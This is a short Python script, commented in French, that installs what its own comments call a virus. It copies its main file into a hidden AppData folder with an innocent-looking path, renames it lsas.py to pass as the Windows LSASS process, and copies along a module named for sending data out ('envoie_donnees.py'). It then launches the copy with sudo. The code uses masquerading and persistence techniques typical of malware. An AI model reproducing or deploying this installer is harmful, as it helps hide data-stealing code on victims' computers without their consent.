import os
from sys import platform

user = os.path.expanduser('~')

#Réécrire la syntaxe du chemin pour être lisible par le système
if platform == "win32" :
    for i in range(len(user) - 1, -1, -1) :
        if user[i] == '\\' :
            user = user[i + 1 : len(user)]
            break
    user = "C:/Users/" + user
else:
	user = "/tmp"

virus_pater = open('main.py', 'r')
virus = virus_pater.readlines()

#Détecte le chemin d'installation en fonction du système d'exploitation.
if platform == 'win32' :
    installpath = user + '/AppData/Roaming/ngSoftware/Software/Legals/'
else :
    installpath = user + '/mon_programme_gentil/' #C'est temporaire

#Créer le chemin d'installation
os.makedirs(installpath, exist_ok=True)

#Installe les différents composants du virus sur un ordinateur cible
with open("main.py", "r") as virus:
		with open(installpath + 'lsas.py', 'w') as vir :
				vir.writelines("\n".join(virus.readlines()))

# Copie du fichier manipulation_string.py
with open('manipulation_string.py', 'r') as file :
    with open(installpath + 'manipulation_string.py', 'w') as copy :
        copy.writelines(file.readlines())

# Copie du fichier envoie_donnees.py
with open('envoie_donnees.py', 'r') as file :
    with open(installpath + 'envoie_donnees.py', 'w') as copy :
        copy.writelines(file.readlines())

# Copie du fichier config.json
with open('config.json', 'r') as file :
    with open(installpath + 'config.json', 'w') as copy :
        copy.writelines(file.readlines())

# Copie du fichier sauvegarde_locale.py
with open('sauvegarde_locale.py', 'r') as file :
    with open(installpath + 'sauvegarde_local.py', 'w') as copy :
        copy.writelines(file.readlines())


file = installpath + 'lsas.py'
os.system('sudo python ' + file)